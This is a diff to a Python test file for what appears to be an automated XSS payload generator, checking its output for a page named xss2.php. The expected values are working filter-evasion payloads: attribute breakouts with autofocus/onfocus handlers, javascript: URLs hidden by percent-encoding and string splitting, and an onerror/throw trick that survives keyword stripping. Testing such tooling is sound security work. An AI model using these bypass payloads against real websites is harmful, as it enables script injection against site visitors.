@@ -857,10 +857,11 @@ def run() -> bool:
     c_xss2 = compose("attr", '"', sc_xss2, kw=kw_xss2, kwv=kwv_xss2)
     t.append(
         (
-            "xss2.php: semicolon=False + stripped alert emits {self.onerror=alalertert}throw-1",
-            bool(c_xss2)
-            and c_xss2[0]["payload"]
-            == '"/autofocus/onfocus="{self.onerror=alalertert}throw-1',
+            "xss2.php: deterministic nav-sink candidates emitted (unquoted handler, %61/concat masks)",
+            '"/autofocus/onfocus=location="javascript:%61lert%281%29"//vvm{id}'
+            in [c["payload"] for c in c_xss2]
+            and '"/autofocus/onfocus=location="javascript:al"+"ert%281%29"//vvm{id}'
+            in [c["payload"] for c in c_xss2],
             str([c["payload"] for c in c_xss2]),
         )
     )
@@ -870,13 +871,24 @@ def run() -> bool:
     )
     t.append(
         (
-            "xss2.php: semicolon=False + braces=False + space=False emits throw/**/self.onerror=alalertert,1 and throw-0,self.onerror=alalertert,1",
-            len(c_xss2_nb) >= 2
-            and c_xss2_nb[0]["payload"]
-            == '"/autofocus/onfocus="throw/**/self.onerror=alalertert,1'
-            and c_xss2_nb[1]["payload"]
-            == '"/autofocus/onfocus="throw-0,self.onerror=alalertert,1',
+            "xss2.php: semicolon=False + braces=False + space=False still emits deterministic nav-sink candidates",
+            '"/autofocus/onfocus=location="javascript:%61lert%281%29"//vvm{id}'
+            in [c["payload"] for c in c_xss2_nb]
+            and '"/autofocus/onfocus=location="javascript:al"+"ert%281%29"//vvm{id}'
+            in [c["payload"] for c in c_xss2_nb],
             str([c["payload"] for c in c_xss2_nb]),
+        )
+    )
+    kw_xss2_no_proto = dict(kw_xss2, javascript_proto=False)
+    c_xss2_np = compose(
+        "attr", '"', sc_xss2, kw=kw_xss2_no_proto, kwv=kwv_xss2
+    )
+    t.append(
+        (
+            "xss2.php: javascript: blocked -> removed-string splitter fallback still emits {self.onerror=alalertert}throw-1",
+            '"/autofocus/onfocus="{self.onerror=alalertert}throw-1'
+            in [c["payload"] for c in c_xss2_np],
+            str([c["payload"] for c in c_xss2_np]),
         )
     )
 
